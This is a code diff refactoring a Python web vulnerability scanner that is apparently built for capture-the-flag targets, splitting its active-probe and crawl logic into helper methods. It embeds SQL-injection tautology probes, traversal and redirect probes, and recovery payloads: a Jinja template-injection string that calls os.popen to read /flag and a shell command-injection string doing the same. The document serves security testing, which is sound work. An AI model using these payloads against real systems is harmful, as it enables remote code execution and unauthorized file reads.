@@ -8,7 +8,6 @@ from hashlib import sha256
 from html import unescape
 from html.parser import HTMLParser
 from http.cookiejar import Cookie, CookieJar
-from urllib.error import URLError
 from urllib.parse import parse_qsl, quote_plus, urlencode, urljoin, urlsplit, urlunsplit
 from urllib.request import (
     HTTPCookieProcessor,
@@ -108,6 +107,14 @@ def _hypothesis_applies(rule: tuple, key: str, generic: bool) -> bool:
         return True
     return pattern is not None and re.search(pattern, key) is not None
 
+_ACTIVE_PROBES = {
+    "WEB-CMDI-001": CMD_PROBE,
+    "WEB-SSTI-001": SSTI_PROBE,
+    "WEB-FILE-001": "../WCS_NONEXISTENT_7f31a9",
+    "WEB-REDIR-001": "https://example.invalid/wcs",
+    "WEB-XSS-001": XSS_PROBE,
+}
+
 
 @dataclass
 class Form:
@@ -132,8 +139,7 @@ class PageParser(HTMLParser):
         data = {k.lower(): (v or "") for k, v in attrs}
         name = tag.lower()
         if name in {"a", "link"} and data.get("href"):
-            if name == "a" or data.get("rel", "").lower() in {"canonical", "alternate"}:
-                self.links.append(data["href"])
+            self._add_anchor_link(name, data)
         elif name in {"iframe", "frame"} and data.get("src"):
             self.links.append(data["src"])
         elif name == "script" and data.get("src"):
@@ -146,6 +152,10 @@ class PageParser(HTMLParser):
             self._add_option(attrs, data)
         elif name in {"input", "textarea"} and self._form and data.get("name"):
             self._form.inputs.append((data["name"], data.get("type", "text").lower(), data.get("value", "")))
+
+    def _add_anchor_link(self, name: str, data: dict[str, str]) -> None:
+        if name == "a" or data.get("rel", "").lower() in {"canonical", "alternate"}:
+            self.links.append(data["href"])
 
     def _start_form(self, data: dict[str, str]) -> None:
         self._form = Form(data.get("action", ""), data.get("method", "get").upper())
@@ -479,31 +489,34 @@ class Scanner:
             out.append((parameter, value))
         return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), ""))
 
+    def _send_probe(self, finding: Finding, value: str) -> Response:
+        fields = dict(finding.request_fields)
+        fields[finding.parameter] = value
+        if finding.method == "POST":
+            return self._request(finding.url, "POST", urlencode(fields).encode())
+        url = finding.url
+        for key, field_value in fields.items():
+            url = self._set_query(url, key, field_value)
+        return self._request(url)
+
     def _active_probe(self, finding: Finding) -> Finding | None:
         if finding.parameter == "" or self.requests_sent + 2 > self.max_requests:
             return None
+        probe = _ACTIVE_PROBES.get(finding.rule, "'")
+        baseline, tested = self._send_probe(finding, "WCSBASE"), self._send_probe(finding, probe)
+        return (
+            self._confirm_sqli_error(finding, probe, baseline, tested)
+            or self._confirm_sqli_boolean(finding)
+            or self._confirm_ssti(finding, baseline, tested)
+            or self._confirm_ssti_alternates(finding, baseline)
+            or self._confirm_cmdi(finding, probe, baseline, tested)
+            or self._confirm_redirect(finding, probe, tested)
+            or self._confirm_file_path(finding, probe, baseline, tested)
+            or self._confirm_xss(finding, probe, baseline, tested)
+        )
+
+    def _confirm_sqli_error(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
         method = finding.method
-        base_value, probe = "WCSBASE", "'"
-        if finding.rule == "WEB-CMDI-001":
-            probe = CMD_PROBE
-        elif finding.rule == "WEB-SSTI-001":
-            probe = SSTI_PROBE
-        elif finding.rule == "WEB-FILE-001":
-            probe = "../WCS_NONEXISTENT_7f31a9"
-        elif finding.rule == "WEB-REDIR-001":
-            probe = "https://example.invalid/wcs"
-        elif finding.rule == "WEB-XSS-001":
-            probe = XSS_PROBE
-        def send(value: str) -> Response:
-            fields = dict(finding.request_fields)
-            fields[finding.parameter] = value
-            if method == "POST":
-                return self._request(finding.url, "POST", urlencode(fields).encode())
-            url = finding.url
-            for key, field_value in fields.items():
-                url = self._set_query(url, key, field_value)
-            return self._request(url)
-        baseline, tested = send(base_value), send(probe)
         body_low = tested.text.lower()
         if finding.rule == "WEB-SQLI-001" and any(sig in body_low for sig in SQL_ERRORS) and not any(sig in baseline.text.lower() for sig in SQL_ERRORS):
             return self._finding(rule=finding.rule, title="SQL injection error behavior confirmed", severity="high", confidence="high",
@@ -514,11 +527,15 @@ class Scanner:
                 flag_path="The parameter reaches a SQL parser. Recovering the flag still requires schema/context discovery; this scan does not extract data.",
                 method=method, request_fields=finding.request_fields, proof_payload=probe,
                 expected_evidence="database error signature absent from baseline")
+        return None
+
+    def _confirm_sqli_boolean(self, finding: Finding) -> Finding | None:
+        method = finding.method
         if finding.rule == "WEB-SQLI-001" and self.requests_sent + 4 <= self.max_requests:
             true_payload = "' OR '1'='1'-- "
             false_payload = "' OR '1'='2'-- "
-            true_one, false_one = send(true_payload), send(false_payload)
-            true_two, false_two = send(true_payload), send(false_payload)
+            true_one, false_one = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)
+            true_two, false_two = self._send_probe(finding, true_payload), self._send_probe(finding, false_payload)
 
             def sql_signature(response: Response, payload: str) -> tuple[int, str]:
                 # Remove simple reflection before comparing. This prevents an echo
@@ -549,6 +566,10 @@ class Scanner:
                     proof_payload=true_payload,
                     expected_evidence="stable response differs from the contradiction pair",
                 )
+        return None
+
+    def _confirm_ssti(self, finding: Finding, baseline: Response, tested: Response) -> Finding | None:
+        method = finding.method
         if (finding.rule == "WEB-SSTI-001" and SSTI_RESULT in tested.text
                 and SSTI_RESULT not in baseline.text and SSTI_RESULT not in SSTI_PROBE):
             recovery = "{{cycler.__init__.__globals__.os.popen('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null').read()}}"
@@ -565,6 +586,10 @@ class Scanner:
                 expected_evidence=SSTI_RESULT, recovery_payload=recovery,
                 flag_path="Jinja expression syntax was verified; the recovery payload reads common CTF flag paths.",
             )
+        return None
+
+    def _confirm_ssti_alternates(self, finding: Finding, baseline: Response) -> Finding | None:
+        method = finding.method
         if (self.ssti_alternates and finding.rule == "WEB-SSTI-001"
                 and SSTI_RESULT not in baseline.text):
             # Repeated arithmetic evaluations only; never infer an RCE payload.
@@ -573,7 +598,7 @@ class Scanner:
             for family, alternate in SSTI_ALTERNATE_PROBES:
                 if self.requests_sent + 2 > self.max_requests:
                     break
-                first, second = send(alternate), send(alternate)
+                first, second = self._send_probe(finding, alternate), self._send_probe(finding, alternate)
                 if (SSTI_RESULT not in alternate
                         and SSTI_RESULT in first.text and SSTI_RESULT in second.text
                         and first.status == second.status
@@ -596,6 +621,10 @@ class Scanner:
                         proof_payload=alternate, expected_evidence=SSTI_RESULT,
                         flag_path="Only arithmetic evaluation was observed; no automatic recovery payload exists.",
                     )
+        return None
+
+    def _confirm_cmdi(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
+        method = finding.method
         if finding.rule == "WEB-CMDI-001" and CMD_RESULT in tested.text and CMD_RESULT not in baseline.text and CMD_RESULT not in CMD_PROBE:
             recovery = ";printf WCSA;cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null;printf WCSZ"
             return self._finding(rule=finding.rule, title="Command injection arithmetic execution confirmed", severity="critical", confidence="high",
@@ -607,6 +636,10 @@ class Scanner:
                 flag_path=f"The verified shell syntax supports the recovery payload for {finding.parameter}; the scanner does not submit it automatically.",
                 method=method, request_fields=finding.request_fields, proof_payload=probe,
                 expected_evidence=CMD_RESULT, recovery_payload=recovery)
+        return None
+
+    def _confirm_redirect(self, finding: Finding, probe: str, tested: Response) -> Finding | None:
+        method = finding.method
         location = tested.headers.get("location", "")
         if finding.rule == "WEB-REDIR-001" and location and urlsplit(urljoin(finding.url, location)).netloc == "example.invalid":
             return self._finding(rule=finding.rule, title="Cross-origin redirect confirmed", severity="medium", confidence="high",
@@ -615,6 +648,10 @@ class Scanner:
                 patch="Resolve redirects against a strict same-origin path allowlist.", method=method,
                 request_fields=finding.request_fields, proof_payload=probe,
                 expected_evidence="Location header points to example.invalid")
+        return None
+
+    def _confirm_file_path(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
+        method = finding.method
         if finding.rule == "WEB-FILE-001" and tested.status != baseline.status:
             return self._finding(rule=finding.rule, title="Path input changes resource behavior", severity="low", confidence="medium",
                 url=finding.url, parameter=finding.parameter,
@@ -622,6 +659,10 @@ class Scanner:
                 vector=f"Set {finding.parameter}=../WCS_NONEXISTENT_7f31a9 to reproduce the differential.", patch=finding.patch,
                 method=method, request_fields=finding.request_fields, proof_payload=probe,
                 expected_evidence=f"HTTP status differs from baseline {baseline.status}")
+        return None
+
+    def _confirm_xss(self, finding: Finding, probe: str, baseline: Response, tested: Response) -> Finding | None:
+        method = finding.method
         if finding.rule == "WEB-XSS-001" and XSS_PROBE in tested.text and XSS_PROBE not in baseline.text:
             ctype = tested.headers.get("content-type", "").lower()
             if "html" in ctype or HTML_MARKER in tested.text[:500].lower():
@@ -885,14 +926,7 @@ class Scanner:
             ))
         return out
 
-    def scan(self) -> ScanReport:
-        report = ScanReport(self.target, self.active, profiles=(self.profile,),
-                            session_source=self.session.source if self.session else "none")
-        queue = deque(dict.fromkeys((self.target, *self.inventory_urls)))
-        seen: set[str] = set()
-        successful_pages = 0
-        candidates: list[Finding] = []
-        discovered_routes = 0
+    def _collect_metadata(self, report: ScanReport) -> None:
         for method in ("HEAD", "OPTIONS"):
             if self.requests_sent >= self.max_requests:
                 break
@@ -900,8 +934,48 @@ class Scanner:
                 metadata = self._request(self.target, method)
                 report.findings.extend(self._posture_findings(metadata, method))
                 report.findings.extend(self._metadata_findings(metadata, method))
-            except (URLError, OSError, RuntimeError, ValueError):
+            except (OSError, RuntimeError, ValueError):
                 report.errors.append(f"{method} metadata request failed")
+
+    def _script_routes(self, response: Response, parser: PageParser,
+                       report: ScanReport) -> list:
+        # Examine inline scripts and bounded same-origin JavaScript files for
+        # literal GET routes. Never execute JavaScript or issue inferred POSTs.
+        routes = []
+        routes.extend(self._static_get_routes(response.text))
+        for script in parser.scripts[:10]:
+            script_url = self._clean_url(urljoin(response.url, script))
+            if not self._in_scope(script_url) or self.requests_sent >= self.max_requests:
+                continue
+            try:
+                js = self._request(script_url)
+                if len(js.text) <= MAX_BODY and js.status == 200:
+                    routes.extend(self._static_get_routes(js.text))
+                    report.findings.extend(self._source_map_hints(js))
+                    report.findings.extend(self._js_comment_hints(js))
+                    report.findings.extend(self._js_api_findings(js))
+            except (OSError, RuntimeError, ValueError):
+                continue
+        return routes
+
+    def _enqueue_routes(self, response: Response, routes: list, seen: set[str], queue: deque) -> None:
+        for href in routes:
+            try:
+                nxt = self._clean_url(urljoin(response.url, href))
+                parsed_nxt = urlsplit(nxt)
+                if parsed_nxt.scheme not in {"http", "https"}:
+                    continue
+                if self._in_scope(nxt) and nxt not in seen and nxt not in queue:
+                    queue.append(nxt)
+            except ValueError:
+                continue
+
+    def _crawl(self, report: ScanReport) -> tuple[int, list[Finding], int]:
+        queue = deque(dict.fromkeys((self.target, *self.inventory_urls)))
+        seen: set[str] = set()
+        successful_pages = 0
+        candidates: list[Finding] = []
+        discovered_routes = 0
         while queue and len(seen) < self.max_pages and self.requests_sent < self.max_requests:
             url = queue.popleft()
             if url in seen:
@@ -909,89 +983,79 @@ class Scanner:
             seen.add(url)
             try:
                 response = self._request(url)
-            except (URLError, OSError, RuntimeError, ValueError):
+            except (OSError, RuntimeError, ValueError):
                 report.errors.append(f"{redact_url(url)}: request failed")
                 continue
             successful_pages += 1
             parser = PageParser()
             ctype = response.headers.get("content-type", "")
-            if "html" in ctype or HTML_MARKER in response.text[:500].lower():
+            is_html = "html" in ctype or HTML_MARKER in response.text[:500].lower()
+            if is_html:
                 parser.feed(response.text)
             self.observations[response.url] = self._observe(response, parser)
             items = self._posture_findings(response) + self._passive_findings(response, parser)
             report.findings.extend(items)
             candidates.extend(item for item in items if item.rule in {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-CMDI-001", "WEB-FILE-001", "WEB-REDIR-001", "WEB-XSS-001"})
-            # Examine inline scripts and bounded same-origin JavaScript files for
-            # literal GET routes. Never execute JavaScript or issue inferred POSTs.
             routes = list(parser.links)
-            if "html" in ctype or HTML_MARKER in response.text[:500].lower():
-                routes.extend(self._static_get_routes(response.text))
-                for script in parser.scripts[:10]:
-                    script_url = self._clean_url(urljoin(response.url, script))
-                    if not self._in_scope(script_url) or self.requests_sent >= self.max_requests:
-                        continue
-                    try:
-                        js = self._request(script_url)
-                        if len(js.text) <= MAX_BODY and js.status == 200:
-                            routes.extend(self._static_get_routes(js.text))
-                            report.findings.extend(self._source_map_hints(js))
-                            report.findings.extend(self._js_comment_hints(js))
-                            report.findings.extend(self._js_api_findings(js))
-                    except (URLError, OSError, RuntimeError, ValueError):
-                        continue
+            if is_html:
+                routes.extend(self._script_routes(response, parser, report))
             discovered_routes += len(routes)
-            for href in routes:
-                try:
-                    nxt = self._clean_url(urljoin(response.url, href))
-                    parsed_nxt = urlsplit(nxt)
-                    if parsed_nxt.scheme not in {"http", "https"}:
-                        continue
-                    if self._in_scope(nxt) and nxt not in seen and nxt not in queue:
-                        queue.append(nxt)
-                except ValueError:
-                    continue
+            self._enqueue_routes(response, routes, seen, queue)
+        return successful_pages, candidates, discovered_routes
+
+    def _run_active_probes(self, report: ScanReport, candidates: list[Finding]) -> None:
+        probe_priority = {
+            "WEB-CMDI-001": 0,
+            "WEB-SSTI-001": 1,
+            "WEB-SQLI-001": 2,
+            "WEB-FILE-001": 3,
+            "WEB-REDIR-001": 4,
+            "WEB-XSS-001": 5,
+        }
+        for finding in sorted(candidates, key=lambda item: (
+                probe_priority.get(item.rule, 9), item.url, item.parameter, item.id)):
+            if self.requests_sent + 2 > self.max_requests:
+                break
+            try:
+                confirmed = self._active_probe(finding)
+                if confirmed:
+                    report.findings.append(confirmed)
+            except (OSError, RuntimeError, ValueError):
+                report.errors.append(f"active {redact_url(finding.url)}#{finding.parameter}: request failed")
+
+    def _run_nosql_reviews(self, report: ScanReport, candidates: list[Finding]) -> None:
+        reviewed: set[tuple[str, str]] = set()
+        for finding in candidates:
+            if finding.method != "GET" or finding.rule != "WEB-SQLI-001":
+                continue
+            key = (finding.url, finding.parameter)
+            if key in reviewed:
+                continue
+            reviewed.add(key)
+            if len(reviewed) > 3 or self.requests_sent + 4 > self.max_requests:
+                break
+            try:
+                review = self._nosql_query_review(finding)
+                if review:
+                    report.findings.append(review)
+            except (OSError, RuntimeError, ValueError):
+                report.errors.append(
+                    f"noSQL review {redact_url(finding.url)}: request failed")
+
+    def scan(self) -> ScanReport:
+        report = ScanReport(self.target, self.active, profiles=(self.profile,),
+                            session_source=self.session.source if self.session else "none")
+        self._collect_metadata(report)
+        successful_pages, candidates, discovered_routes = self._crawl(report)
         if self.active:
-            probe_priority = {
-                "WEB-CMDI-001": 0,
-                "WEB-SSTI-001": 1,
-                "WEB-SQLI-001": 2,
-                "WEB-FILE-001": 3,
-                "WEB-REDIR-001": 4,
-                "WEB-XSS-001": 5,
-            }
-            for finding in sorted(candidates, key=lambda item: (
-                    probe_priority.get(item.rule, 9), item.url, item.parameter, item.id)):
-                if self.requests_sent + 2 > self.max_requests:
-                    break
-                try:
-                    confirmed = self._active_probe(finding)
-                    if confirmed:
-                        report.findings.append(confirmed)
-                except (URLError, OSError, RuntimeError, ValueError):
-                    report.errors.append(f"active {redact_url(finding.url)}#{finding.parameter}: request failed")
+            self._run_active_probes(report, candidates)
         if self.inventory_urls:
             report.coverage.append(
                 f"Seeded {len(self.inventory_urls)} GET endpoint(s) from a redacted inventory; "
                 "all requests remain subject to normal scan budgets."
             )
         if self.active and self.nosql_query:
-            reviewed: set[tuple[str, str]] = set()
-            for finding in candidates:
-                if finding.method != "GET" or finding.rule != "WEB-SQLI-001":
-                    continue
-                key = (finding.url, finding.parameter)
-                if key in reviewed:
-                    continue
-                reviewed.add(key)
-                if len(reviewed) > 3 or self.requests_sent + 4 > self.max_requests:
-                    break
-                try:
-                    review = self._nosql_query_review(finding)
-                    if review:
-                        report.findings.append(review)
-                except (URLError, OSError, RuntimeError, ValueError):
-                    report.errors.append(
-                        f"noSQL review {redact_url(finding.url)}: request failed")
+            self._run_nosql_reviews(report, candidates)
         if discovered_routes == 0 and not self.inventory_urls:
             report.coverage.append(
                 "No navigable links, GET form actions or literal script GET routes were discovered. "
@@ -1054,6 +1118,47 @@ def scan_profiles(target: str, *, profiles: tuple[str, ...] = ("desktop", "mobil
     return combined
 
 
+def _observation_differences(first: Scanner, second: Scanner, url: str) -> list[str]:
+    left = first.observations.get(url)
+    right = second.observations.get(url)
+    if left is None or right is None:
+        return [f"page visible only to {first.profile if right is None else second.profile}"]
+    differences: list[str] = []
+    if left.status != right.status:
+        differences.append(f"status {first.profile}={left.status}, {second.profile}={right.status}")
+    if (left.body_length, left.body_sha256) != (right.body_length, right.body_sha256):
+        differences.append(
+            f"body {first.profile}=len:{left.body_length},sha256:{left.body_sha256[:12]}; "
+            f"{second.profile}=len:{right.body_length},sha256:{right.body_sha256[:12]}"
+        )
+    if left.forms != right.forms:
+        differences.append(f"form signatures differ ({len(left.forms)} vs {len(right.forms)})")
+    if left.parameters != right.parameters:
+        differences.append(
+            f"parameters {first.profile}={list(left.parameters)}, {second.profile}={list(right.parameters)}"
+        )
+    return differences
+
+
+def _profile_difference_finding(first: Scanner, second: Scanner, url: str,
+                                differences: list[str]) -> Finding:
+    return Finding(
+        rule="WEB-PROFILE-DIFF-001",
+        title="Desktop/mobile response surface differs",
+        severity="info",
+        confidence="high",
+        url=url,
+        profile="comparison",
+        evidence="; ".join(differences),
+        vector=(
+            f"Repeat GET {redact_url(url)} with Sec-CH-UA-Mobile {PROFILES[first.profile]['Sec-CH-UA-Mobile']} "
+            f"and {PROFILES[second.profile]['Sec-CH-UA-Mobile']}; inspect profile-tagged candidates."
+        ),
+        patch="Apply the same authentication, authorization, validation, and output encoding to every device-specific route.",
+        flag_path="A device-specific surface may expose a distinct route or input. Validate its profile-tagged findings before flag recovery.",
+    )
+
+
 def _profile_differences(first: Scanner, second: Scanner,
                          reports: list[ScanReport]) -> list[Finding]:
     out: list[Finding] = []
@@ -1062,25 +1167,7 @@ def _profile_differences(first: Scanner, second: Scanner,
     finding_difference = first_findings != second_findings
     urls = sorted(set(first.observations) | set(second.observations))
     for url in urls:
-        left = first.observations.get(url)
-        right = second.observations.get(url)
-        differences: list[str] = []
-        if left is None or right is None:
-            differences.append(f"page visible only to {first.profile if right is None else second.profile}")
-        else:
-            if left.status != right.status:
-                differences.append(f"status {first.profile}={left.status}, {second.profile}={right.status}")
-            if (left.body_length, left.body_sha256) != (right.body_length, right.body_sha256):
-                differences.append(
-                    f"body {first.profile}=len:{left.body_length},sha256:{left.body_sha256[:12]}; "
-                    f"{second.profile}=len:{right.body_length},sha256:{right.body_sha256[:12]}"
-                )
-            if left.forms != right.forms:
-                differences.append(f"form signatures differ ({len(left.forms)} vs {len(right.forms)})")
-            if left.parameters != right.parameters:
-                differences.append(
-                    f"parameters {first.profile}={list(left.parameters)}, {second.profile}={list(right.parameters)}"
-                )
+        differences = _observation_differences(first, second, url)
         left_rules = sorted((rule, parameter) for finding_url, rule, parameter in first_findings if finding_url == url)
         right_rules = sorted((rule, parameter) for finding_url, rule, parameter in second_findings if finding_url == url)
         if left_rules != right_rules:
@@ -1092,19 +1179,5 @@ def _profile_differences(first: Scanner, second: Scanner,
                 f"profile-only findings {first.profile}={left_only}, {second.profile}={right_only}"
             )
         if differences:
-            out.append(Finding(
-                rule="WEB-PROFILE-DIFF-001",
-                title="Desktop/mobile response surface differs",
-                severity="info",
-                confidence="high",
-                url=url,
-                profile="comparison",
-                evidence="; ".join(differences),
-                vector=(
-                    f"Repeat GET {redact_url(url)} with Sec-CH-UA-Mobile {PROFILES[first.profile]['Sec-CH-UA-Mobile']} "
-                    f"and {PROFILES[second.profile]['Sec-CH-UA-Mobile']}; inspect profile-tagged candidates."
-                ),
-                patch="Apply the same authentication, authorization, validation, and output encoding to every device-specific route.",
-                flag_path="A device-specific surface may expose a distinct route or input. Validate its profile-tagged findings before flag recovery.",
-            ))
+            out.append(_profile_difference_finding(first, second, url, differences))
     return out
